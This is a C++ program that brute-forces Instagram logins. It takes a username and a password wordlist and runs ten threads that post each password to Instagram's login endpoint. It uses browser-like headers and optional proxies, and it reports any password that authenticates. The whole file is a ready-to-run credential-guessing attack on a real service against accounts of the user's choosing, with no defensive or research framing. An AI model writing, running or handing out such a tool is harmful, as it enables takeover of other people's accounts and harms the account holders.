#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <thread>
#include <mutex>
#include <curl/curl.h>

std::mutex cout_mutex;
bool found_flag = false;

struct MemoryStruct {
    char *memory;
    size_t size;
};

static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;
    char *ptr = (char *)realloc(mem->memory, mem->size + realsize);
    if(!ptr) return 0;
    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    return realsize;
}

void test_credential(std::string username, std::string password, std::string proxy) {
    if (found_flag) return;

    CURL *curl;
    CURLcode res;
    struct MemoryStruct chunk;
    chunk.memory = (char *)malloc(1);
    chunk.size = 0;

    curl = curl_easy_init();
    if(curl) {
        std::string url = "https://www.instagram.com/accounts/login/ajax/";
        std::string postfields = "username=" + username + "&enc_password=#PWD_INSTAGRAM_BROWSER:0:0:" + password + "&queryParams={}&optIntoOneTap=false";

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postfields.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
        
        struct curl_slist *headers = NULL;
        headers = curl_slist_append(headers, "X-Requested-With: XMLHttpRequest");
        headers = curl_slist_append(headers, "Referer: https://www.instagram.com/accounts/login/");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        if (!proxy.empty()) {
            curl_easy_setopt(curl, CURLOPT_PROXY, proxy.c_str());
        }

        res = curl_easy_perform(curl);
        
        if(res == CURLE_OK) {
            std::string response(chunk.memory);
            if (response.find("\"authenticated\":true") != std::string::npos) {
                std::lock_guard<std::mutex> lock(cout_mutex);
                std::cout << "\n[!] VALID PASSWORD FOUND: " << password << "\n";
                found_flag = true;
            }
        }

        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
        free(chunk.memory);
    }
}

void worker(std::string username, std::vector<std::string> passwords, int start_idx, int end_idx, std::string proxy) {
    for (int i = start_idx; i < end_idx && !found_flag; ++i) {
        {
            std::lock_guard<std::mutex> lock(cout_mutex);
            std::cout << "[?] Testing: " << passwords[i] << "\r" << std::flush;
        }
        test_credential(username, passwords[i], proxy);
    }
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cout << "Usage: " << argv[0] << " <username> <wordlist.txt>\n";
        return 1;
    }

    std::string target = argv[1];
    std::ifstream file(argv[2]);
    std::vector<std::string> passwords;
    std::string line;

    while (std::getline(file, line)) {
        passwords.push_back(line);
    }
    file.close();

    curl_global_init(CURL_GLOBAL_ALL);

    int num_threads = 10;
    int chunk_size = passwords.size() / num_threads;
    std::vector<std::thread> threads;

    for (int i = 0; i < num_threads; ++i) {
        int start = i * chunk_size;
        int end = (i == num_threads - 1) ? passwords.size() : (start + chunk_size);
        threads.emplace_back(worker, target, passwords, start, end, "");
    }

    for (auto& th : threads) {
        th.join();
    }

    curl_global_cleanup();
    std::cout << "\n[+] Execution complete.\n";
    return 0;
}
